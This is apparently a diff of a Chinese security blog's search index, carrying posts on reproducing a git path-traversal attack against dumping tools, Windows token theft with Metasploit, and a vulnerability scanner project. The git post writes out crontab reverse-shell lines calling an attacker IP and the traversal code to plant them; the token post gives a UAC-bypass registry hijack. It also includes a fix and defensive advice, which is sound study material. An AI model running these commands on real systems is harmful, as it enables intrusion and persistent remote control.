-<h3 id="1-1-计划任务反弹shell"><a href="#1-1-计划任务反弹shell" class="headerlink" title="1.1 计划任务反弹shell"></a>1.1 计划任务反弹shell</h3><p>先在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 下新建名为 root 的反弹shell代码文件。</p>
-<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
-<p>然后将<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> 中的<code>../../git_poc.txt</code> 替换, 使用多个**..&#x2F;**,确保返回到根目录 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">repo.index.add(items=[<span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root (centos系列主机)</p>
-<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (debian系列主机)</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174751.png" alt="image-20210809173416573"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174728.png" alt="image-20210809173349713"></p>
-<h2 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h2><p>这就是个目录穿越漏洞，这里简单粗暴的将 <strong>..&#x2F;</strong> 全部删除，以dumpall为例 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumpall/dumper.py</span></span><br><span class="line">filename = <span class="built_in">str</span>(filename).replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;/&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174721.png" alt="image-20210809174123558"></p>
-<h2 id="0x03在ubuntu中反弹shell问题"><a href="#0x03在ubuntu中反弹shell问题" class="headerlink" title="0x03在ubuntu中反弹shell问题"></a>0x03在ubuntu中反弹shell问题</h2><p>有师傅反应说上一篇<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484658&idx=1&sn=84f39840f9a8104edc4fde4c7962fed6&chksm=c2829debf5f514fd40c1abbe73beabe02b2cbe1e190504bb5e060ab445d1cab086c247674fa4&scene=21#wechat_redirect">git 蜜罐复现</a>文章中在ubuntu和kali写入了计划任务，还是不能反弹shell。</p>
-<p>关于这一点我在做实验时，一开始也是没有反弹shell，我手动编辑了几遍root文件，具体弹shell的代码并没有改变，然后就莫名其妙的弹回来了，忙着发文，也就没有再次实验，我的错。</p>
-<p>今天又试了好多次，还是弹不回来，终于找到了原因，这东西就是<strong>ubuntu系统的原因，root文件的权限必须为600</strong>，还有就是弹的代码也有点问题，这是原文链接：</p>
-<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
-<p>shell不能反弹，可以写ssh公钥等，最后他给的弹shell代码<strong>好像</strong>还有点问题，在代码前后空一格，写入换行符</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*/1 * * * * bash -c <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
-<p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
-<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-        <category>蜜罐</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>蜜罐</tag>
       </tags>
   </entry>
   <entry>
@@ -1423,6 +1318,140 @@
       </tags>
   </entry>
   <entry>
+    <title>git 蜜罐复现</title>
+    <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<blockquote>
+<p>  好久不见</p>
+</blockquote>
+<h2 id="0x01-git-蜜罐复现"><a href="#0x01-git-蜜罐复现" class="headerlink" title="0x01 git 蜜罐复现"></a>0x01 git 蜜罐复现</h2><p>具体原理请看 <a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> git</span><br><span class="line"></span><br><span class="line">repo = git.Repo.init(path=<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">repo.index.add(items=[<span class="string">&#x27;../../git_poc.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">repo.index.commit(<span class="string">&#x27;commit&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>python3 -m pip install GitPython</code></p>
+<p>python3 运行, 生成Poc </p>
+<blockquote>
+<p>  在当前目录的..&#x2F;..&#x2F;的目录下必须有git_poc.txt</p>
+</blockquote>
+<p>比如当前脚本目录为 <code>/Users/yhy/Desktop/gitpoc</code>,那么在<code>/Users/yhy</code>要存在<code>git_poc.txt</code></p>
+<p>然后将 <strong>.git</strong> 文件夹整体拖入网站根目录下</p>
+<p>效果：防止干扰我直接在虚拟机中运行 <a href="https://github.com/0xHJK/dumpall.git">dumpall</a> 工具</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174743.png" alt="image-20210809154939407"></p>
+<p>没有在 <strong>dumpall&#x2F;192.168.100.250_8080</strong> 目录下生成文件，而是进行了<strong>目录穿越</strong>,在原计划（dumpall&#x2F;192.168.100.250_8080）两层外的目录下生成了git_poc</p>
+<h3 id="1-1-计划任务反弹shell"><a href="#1-1-计划任务反弹shell" class="headerlink" title="1.1 计划任务反弹shell"></a>1.1 计划任务反弹shell</h3><p>先在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 下新建名为 root 的反弹shell代码文件。</p>
+<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
+<p>然后将<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> 中的<code>../../git_poc.txt</code> 替换, 使用多个**..&#x2F;**,确保返回到根目录 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">repo.index.add(items=[<span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root (centos系列主机)</p>
+<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (debian系列主机)</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174751.png" alt="image-20210809173416573"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174728.png" alt="image-20210809173349713"></p>
+<h2 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h2><p>这就是个目录穿越漏洞，这里简单粗暴的将 <strong>..&#x2F;</strong> 全部删除，以dumpall为例 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumpall/dumper.py</span></span><br><span class="line">filename = <span class="built_in">str</span>(filename).replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;/&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174721.png" alt="image-20210809174123558"></p>
+<h2 id="0x03在ubuntu中反弹shell问题"><a href="#0x03在ubuntu中反弹shell问题" class="headerlink" title="0x03在ubuntu中反弹shell问题"></a>0x03在ubuntu中反弹shell问题</h2><p>有师傅反应说上一篇<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484658&idx=1&sn=84f39840f9a8104edc4fde4c7962fed6&chksm=c2829debf5f514fd40c1abbe73beabe02b2cbe1e190504bb5e060ab445d1cab086c247674fa4&scene=21#wechat_redirect">git 蜜罐复现</a>文章中在ubuntu和kali写入了计划任务，还是不能反弹shell。</p>
+<p>关于这一点我在做实验时，一开始也是没有反弹shell，我手动编辑了几遍root文件，具体弹shell的代码并没有改变，然后就莫名其妙的弹回来了，忙着发文，也就没有再次实验，我的错。</p>
+<p>今天又试了好多次，还是弹不回来，终于找到了原因，这东西就是<strong>ubuntu系统的原因，root文件的权限必须为600</strong>，还有就是弹的代码也有点问题，这是原文链接：</p>
+<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+<p>shell不能反弹，可以写ssh公钥等，最后他给的弹shell代码<strong>好像</strong>还有点问题，在代码前后空一格，写入换行符</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*/1 * * * * bash -c <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
+<p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
+<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>蜜罐</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>蜜罐</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>令牌窃取分析及防范</title>
+    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
+    <content><![CDATA[<blockquote>
+<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
+</blockquote>
+<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
+<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
+<ul>
+<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
+<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
+<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
+</ul>
+<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
+<p>目前访问令牌分为两种令牌：</p>
+<ul>
+<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
+<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
+</ul>
+<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
+<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
+<ul>
+<li>用户帐户的安全标识符(SID)</li>
+<li>用户帐户所属的用户群的SIDs</li>
+<li>一个logon SID，标识当前登录会话</li>
+<li>用户或用户群的特权清单</li>
+<li>所有者的SID</li>
+<li>基本群的SID</li>
+<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
+<li>访问令牌资源</li>
+<li>是否为primary或impersonation token</li>
+<li>限制性SIDs的可选列表</li>
+<li>当前impersonation级别</li>
+<li>其他统计</li>
+</ul>
+<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
+<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
+<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
+<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
+<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
+<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
+<blockquote>
+<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
+<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
+</blockquote>
+<p>得到授权令牌：		</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
+
+<p>得到模拟令牌：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
+
+<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
+<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
+<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
+<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
+<ul>
+<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
+<li>及时安装微软推送的补丁</li>
+<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
+<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
+<li>对于令牌，应采取加密存储及多长验证保护</li>
+<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
+</ul>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>初探JWT</title>
     <url>/2021/03/05/%E5%88%9D%E6%8E%A2JWT/</url>
     <content><![CDATA[<blockquote>
@@ -1542,158 +1571,54 @@
       </tags>
   </entry>
   <entry>
-    <title>令牌窃取分析及防范</title>
-    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
-    <content><![CDATA[<blockquote>
-<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
-</blockquote>
-<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
-<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
+    <title>Jie 扫描器</title>
+    <url>/2023/03/06/Jie%20%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
+    <content><![CDATA[<h2 id="劫-开发中-持续更新中"><a href="#劫-开发中-持续更新中" class="headerlink" title="劫(开发中,持续更新中)"></a>劫(开发中,持续更新中)</h2><p>具体漏洞开发详情，请移步 <a href="https://jie.fireline.fun/">https://jie.fireline.fun/</a></p>
+<p>基于浏览器爬虫开发的web漏洞主动 (被动) 扫描器</p>
+<p>由于扫描器只是粗暴的调用 xray、nuclei ，不优雅，而且 xray 不开源，不开源的东西我加入自己的扫描器用着不舒服(纯属给自己挖坑，就当给自己加深漏洞理解了，开发中代码很烂勿喷)。于是产生一个想法，将漏扫类项目拆分出来，重新糅合成一个轮子。</p>
+<p>目前打算设计成两种模式:</p>
 <ul>
-<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
-<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
-<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
+<li>一种被动 优先级低</li>
+<li>一种主动</li>
 </ul>
-<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
-<p>目前访问令牌分为两种令牌：</p>
-<ul>
-<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
-<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
+<h2 id="已有功能"><a href="#已有功能" class="headerlink" title="已有功能"></a>已有功能</h2><ul>
+<li>Chrome Headless 爬虫, 爬取中进行指纹识别(katana)</li>
+<li>指纹识别，根据指纹识别进行漏洞检测(nuclei)</li>
+<li>基础漏洞扫描 (sql、xss 等) 待优化</li>
+<li>目录扫描(bbscan规则)</li>
+<li><del>一些端口弱口令爆破</del>(这还要在加上端口扫描，先去除)</li>
 </ul>
-<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
-<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
-<ul>
-<li>用户帐户的安全标识符(SID)</li>
-<li>用户帐户所属的用户群的SIDs</li>
-<li>一个logon SID，标识当前登录会话</li>
-<li>用户或用户群的特权清单</li>
-<li>所有者的SID</li>
-<li>基本群的SID</li>
-<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
-<li>访问令牌资源</li>
-<li>是否为primary或impersonation token</li>
-<li>限制性SIDs的可选列表</li>
-<li>当前impersonation级别</li>
-<li>其他统计</li>
-</ul>
-<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
-<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
-<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
-<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
-<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
-<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
-<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
-<blockquote>
-<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
-<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
-</blockquote>
-<p>得到授权令牌：		</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
-
-<p>得到模拟令牌：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
-
-<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
-<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
-<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
-<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
-<ul>
-<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
-<li>及时安装微软推送的补丁</li>
-<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
-<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
-<li>对于令牌，应采取加密存储及多长验证保护</li>
-<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
-</ul>
+<h2 id="语言环境识别"><a href="#语言环境识别" class="headerlink" title="语言环境识别"></a>语言环境识别</h2><p>防止对 php 的网站调用 java 的扫描插件</p>
+<h2 id="插件调用-后期看看有没有必要吧"><a href="#插件调用-后期看看有没有必要吧" class="headerlink" title="插件调用(后期看看有没有必要吧)"></a>插件调用(后期看看有没有必要吧)</h2><p>插件如何调用？ 这里直接放弃，只要代码逻辑写好就行了，后期或者有重构的想法</p>
+<p><del>仿照awvs设计了插件类别</del></p>
+<p><del>PerFile 对每个文件处理,包括文件后面的参数</del></p>
+<p><del>PerFolder 对每个目录处理</del></p>
+<p><del>PerScheme 对每个域名处理</del></p>
+<p><del>PostScan 对Post请求的处理</del></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><p><a href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a></p>
+<p>添加了无头浏览器检测绕过 <a href="https://bot.sannysoft.com/">https://bot.sannysoft.com/</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202303062213518.png" alt="BypassHeadlessDetect.png"></p>
+<h3 id="被动扫描代理"><a href="#被动扫描代理" class="headerlink" title="被动扫描代理"></a>被动扫描代理</h3><p><a href="https://github.com/lqqyt2423/go-mitmproxy">https://github.com/lqqyt2423/go-mitmproxy</a></p>
+<h3 id="Xss"><a href="#Xss" class="headerlink" title="Xss"></a>Xss</h3><p><a href="https://github.com/hahwul/dalfox">https://github.com/hahwul/dalfox</a> 什么玩意，发的包也太多了，后续去掉</p>
